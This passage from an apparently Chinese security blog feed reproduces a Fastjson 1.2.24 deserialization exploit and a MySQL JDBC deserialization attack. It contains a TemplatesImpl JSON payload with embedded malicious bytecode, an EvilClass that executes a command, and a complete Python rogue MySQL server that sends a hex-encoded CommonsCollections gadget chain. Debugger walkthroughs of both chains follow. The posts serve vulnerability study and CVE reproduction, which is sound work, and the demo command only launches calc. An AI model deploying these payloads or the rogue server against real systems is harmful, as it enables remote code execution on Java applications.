        String payload = &quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMRXZpbENsYXNzOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJZXZpbENsYXNzBwAuAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAIAAkHAC8MADAAMQEACGNhbGMuZXhlDAAyADMBAAlFdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAA8AAAAEAAEAFwABABEAGAACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABkAGgACAAAAAQAbABwAAwAPAAAABAABABcACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;], &apos;_name&apos;:&apos;c.c&apos;, &apos;_tfactory&apos;:{ },\&quot;_outputProperties\&quot;:{}, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;}&quot;;  
        JSON.parseObject(payload, Feature.SupportNonPublicField);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;code&gt;EvilClass&lt;/code&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
import java.io.IOException;  
  
public class EvilClass extends AbstractTranslet {  
    public EvilClass() throws IOException {  
        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException{  
    }  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{  
    }  
  
    public static void main(String[] args) throws Exception{  
        EvilClass evilClass = new EvilClass();  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;code&gt;bytecode生成&lt;/code&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;import java.io.ByteArrayOutputStream;  
import java.io.FileInputStream;  
import java.util.Base64;  
import java.util.Base64.Encoder;  
  
public class HelloWorld {  
    public static void main(String args[]) {  
        byte[] buffer = null;  
        String filepath = &quot;E:\\历史CVE复现\\Java\\Fastjson反序列化\\1.2.24\\untitled\\target\\classes\\EvilClass.class&quot;;  
  
        try {  
            FileInputStream fis = new FileInputStream(filepath);  
            ByteArrayOutputStream bos = new ByteArrayOutputStream();  
            byte[] b = new byte[1024];  
            int n;  
            while((n = fis.read(b))!=-1) {  
                bos.write(b,0,n);  
            }  
            fis.close();  
            bos.close();  
            buffer = bos.toByteArray();  
        }catch(Exception e) {  
            e.printStackTrace();  
        }  
        Encoder encoder = Base64.getEncoder();  
        String value = encoder.encodeToString(buffer);  
        System.out.println(value);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;审计分析&lt;/h3&gt;
&lt;p&gt;前半部分和之前那个userbean的几乎重合,但侧重点有所不同，比如在获得反序列化器那里，这个beanInfo就已经是个关键点了，我们跟进看一看
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150312.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在这里就把get和set给筛进了fieldList里，用不着急等到下一步了。
（仔细看了一遍，在后面那个的那个反序列化器里面，又给重新筛了一遍，逻辑都是一样的，麻）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150529.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150551.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到这里的时候就会把&lt;code&gt;getoutPrinter&lt;/code&gt;筛进fieldList去
调用如下:
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152033.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;调用&lt;code&gt;newTransformer&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152218.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;调用 &lt;code&gt;getTransletInstance()&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152518.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;loader.defineClass&lt;/code&gt;这里加载分批bytescode,这个defineClass相当于是loadclass重写方法,就不跟进了
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152641.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;流程分析のJdbcRowSetImpl&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154350.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进一下&lt;code&gt;setDataSourceName&lt;/code&gt;,这里就是把传进去的值赋给&lt;code&gt;dataSource&lt;/code&gt;,结果如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154450.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;再跟进一下&lt;code&gt;setAutoCommit&lt;/code&gt;方法
关键在 connect() 这个函数上
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154829.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进分析分析，还行那另一处ctx.lookup，值就是刚才赋的datasourcename，一眼jndi注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523160311.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>JDBC反序列化简单审计</title><link>https://f4miti0n.github.io/posts/jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</guid><pubDate>Thu, 04 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
&lt;h3&gt;前情提要&lt;/h3&gt;
&lt;h4&gt;基础原理分析&lt;/h4&gt;
&lt;p&gt;当我们生成序列化文件的时候，里面的前两个字节的值如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230430092003.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230430092036.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一个为&lt;code&gt;-84&lt;/code&gt;，一个为&lt;code&gt;-19&lt;/code&gt; , 在一些反序列化的程序中，就会根据这两个的值判断当前传入流是否是序列化的流，进而决定是否进行反序列化操作，就比如我们的漏洞利用点&lt;code&gt;com.mysql.cj.jdbc.result.ResultSetImpl.getObject()&lt;/code&gt;这一块，他就是依据前两个字节的值，决定是否反序列化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230430092446.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;Mysql认证报文&lt;/h4&gt;
&lt;p&gt;Client&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.sql.*;  
  
public class Client {  
    public static void main(String[] args) throws ClassNotFoundException, SQLException {  
        String Driver = &quot;com.mysql.cj.jdbc.Driver&quot;;  
        String DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true&amp;amp;serverTimezone=GMT%2B8&quot;;  
        //tatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。
        //autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
        Class.forName(Driver);  
        Connection conn = DriverManager.getConnection(DB_URL,&quot;root&quot;,&quot;xxxxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用wireshark得到如下结果  (   &lt;code&gt;tcp.port ==3306 &amp;amp;&amp;amp; mysql&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230501002114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;随便点开一个Response包，查看Mysql Protocol部分，发现认证报文为固定的``0700000200000002000000&lt;code&gt;，&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230501002524.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;回去看看它的问候报文&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230501003223.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;问候报文内容如上，能够看出这里的认证机制是&lt;code&gt;mysql_native-password&lt;/code&gt;
这里也是我们payload的传入点，将该数据包的原始数据传给服务端我们即可进行恶意操作&lt;/p&gt;
&lt;p&gt;【 ps : MySQL的认证机制有多种，其中最常用的是mysql_native_password和caching_sha2_password。mysql_native_password是MySQL早期版本使用的一种认证方式，而caching_sha2_password是MySQL 8.0版本之后默认使用的一种认证方式。在mysql_native_password中，服务器会向客户端发送一个8字节长的随机字符串（scramble），即盐给client；client通过scramble与密码的hash异或（Xor）后得到一个32位哈希值，作为种子随机出一个8字节字符串发送给服务器；服务器再将这个字符串与自己保存的密码hash值进行比较，如果相同则认证成功。】&lt;/p&gt;
&lt;h3&gt;流程分析&lt;/h3&gt;
&lt;p&gt;书接上文，得到漏洞利用点之后，我们一步一步查找用法回溯整条链子，这里对readObject是定位到了&lt;code&gt;com.mysql.jdbc.util.ResultSetUtil&lt;/code&gt;这里
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230430092843.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;接着向上回溯，在&lt;code&gt;com.mysql.jdbc.util.resultSetTomap.populateMapWithSessionStatusValues&lt;/code&gt; 这里发现了唯一一处调用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230430093318.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到这里这条链子就结束了，这个&lt;code&gt;com.mysql.jdbc.util.resultSetTomap.populateMapWithSessionStatusValues&lt;/code&gt;在外部是可以直接被触发的
( ? )到这里咱们理一理它的传递流程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;populateMapWithSessionStatusValues&lt;/code&gt; 新建了一个名为&lt;code&gt;toPopluate&lt;/code&gt;的双&lt;code&gt;String&lt;/code&gt;集合,用来存取&lt;code&gt;SHOW SESSION STAUS&lt;/code&gt;的查询结果（rs），因为rs是个数据表，不能直接传递，所以在&lt;code&gt;resultSetToMap&lt;/code&gt;里面先把他转成了行数据,再从行数据里面挑选第一列和第二列值的反序列化结果分别作为属性和值传递给 &lt;code&gt;toPopluate&lt;/code&gt; 。而这个反序列化究竟能不能执行成功还得分情况而定，当且仅当传入数据为反序列化数据(-84,-19)时，才会对当前数据执行反序列化操作&lt;/p&gt;
&lt;h3&gt;实验代码&lt;/h3&gt;
&lt;p&gt;Java:Client&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.sql.*;  
  
public class Client {  
    public static void main(String[] args) throws ClassNotFoundException, SQLException {  
        String Driver = &quot;com.mysql.cj.jdbc.Driver&quot;;  
        String DB_URL = &quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true&quot;;  
        Class.forName(Driver);  
        Connection conn = DriverManager.getConnection(DB_URL,&quot;root&quot;,&quot;root&quot;);  
        System.out.println(conn);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Python : 恶意服务器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# -*- coding:utf-8 -*-  
#@Time : 2020/7/27 2:10  
#@Author: Tri0mphe7  
#@File : server.py  
import socket  
import binascii  
import os  
  
greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;  
response_ok_data=&quot;0700000200000002000000&quot;  
  
def receive_data(conn):  
    data = conn.recv(1024)  
    print(&quot;[*] Receiveing the package : {}&quot;.format(data))  
    return str(data).lower()  
  
def send_data(conn,data):  
    print(&quot;[*] Sending the package : {}&quot;.format(data))  
    conn.send(binascii.a2b_hex(data))  
  
def get_payload_content():  
    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &amp;gt; a  
    file= r&apos;ooo.txt&apos;  
    if os.path.isfile(file):  
        with open(file, &apos;rb&apos;) as f:  
            payload_content = str(binascii.b2a_hex(f.read()),encoding=&apos;utf-8&apos;)  
        print(&quot;open successs&quot;)  
  
    else:  
        print(&quot;open false&quot;)  
        #calc  
        payload_content=&apos;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&apos;  
    return payload_content  
  
# 主要逻辑  
def run():  
  
    while 1:  
        conn, addr = sk.accept()  
        print(&quot;Connection come from {}:{}&quot;.format(addr[0],addr[1]))  
  
        # 1.先发送第一个 问候报文  
        send_data(conn,greeting_data)  
  
        while True:  
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok  
            receive_data(conn)  
            send_data(conn,response_ok_data)  
  
            #其他过程  
            data=receive_data(conn)  
            #查询一些配置信息,其中会发送自己的 版本号  
  
            if &quot;session.auto_increment_increment&quot; in data:  
                _payload=&apos;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&apos;  
                send_data(conn,_payload)  
                data=receive_data(conn)  
            elif &quot;show warnings&quot; in data:  
                _payload = &apos;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&apos;  
                send_data(conn, _payload)  
                data = receive_data(conn)  
            if &quot;set names&quot; in data:  
                send_data(conn, response_ok_data)  
                data = receive_data(conn)  
            if &quot;set character_set_results&quot; in data:  
                send_data(conn, response_ok_data)  
                data = receive_data(conn)  
            if &quot;show session status&quot; in data:  
                mysql_data = &apos;0100000102&apos;  
                mysql_data += &apos;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&apos;  
                mysql_data += &apos;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&apos;  
                # 为什么我加了EOF Packet 就无法正常运行呢？？  
                #获取payload  
                payload_content=get_payload_content()  
                #计算payload长度  
                payload_length = str(hex(len(payload_content)//2)).replace(&apos;0x&apos;, &apos;&apos;).zfill(4)  
                payload_length_hex = payload_length[2:4] + payload_length[0:2]  
                #计算数据包长度  
                data_len = str(hex(len(payload_content)//2 + 4)).replace(&apos;0x&apos;, &apos;&apos;).zfill(6)  
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]  
                mysql_data += data_len_hex + &apos;04&apos; + &apos;fbfc&apos;+ payload_length_hex  
                mysql_data += str(payload_content)  
                mysql_data += &apos;07000005fe000022000100&apos;  
                send_data(conn, mysql_data)  
                data = receive_data(conn)  
            if &quot;show warnings&quot; in data:  
                payload = &apos;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&apos;  
                send_data(conn, payload)  
            break  
  
  
if __name__ == &apos;__main__&apos;:  
    HOST =&apos;0.0.0.0&apos;  
    PORT = 3309  
  
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间  
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    sk.bind((HOST, PORT))  
    sk.listen(1)  
  
    print(&quot;start fake mysql server listening on {}:{}&quot;.format(HOST,PORT))  
  
    run()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;流程调试&lt;/h3&gt;
&lt;p&gt;在加载jdbc链接处设下断点，然后跟进，他这里面的实际有效内容和重载类似，我们多跟几步
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230504105948.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230504110323.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230504110405.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里是跟到最后一个&lt;code&gt;aDriver.driver.connect&lt;/code&gt;的内部
从里面第一处的&lt;code&gt;ConnectionUrl.getConnectionUrlInstance&lt;/code&gt;开始理一理断点的逻辑
第一处的返回值是个字符串，他会根据我们传入的jdbc的url和jdbc的账号密码，实例化出一个用于链接的ConnectionUrl对象(其实就是个json对象，有一堆属性表明链接类型)&lt;/p&gt;
&lt;p&gt;第二处&lt;code&gt;ConnectionUrlImpl.getInstance&lt;/code&gt;是返回了一个具体的链接对象,里面的加工比较关键,我们跟到内部看一看
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230504112515.png&quot; alt=&quot;&quot; /&gt;
一个没什么营养的重载，接着跟
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230504113906.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
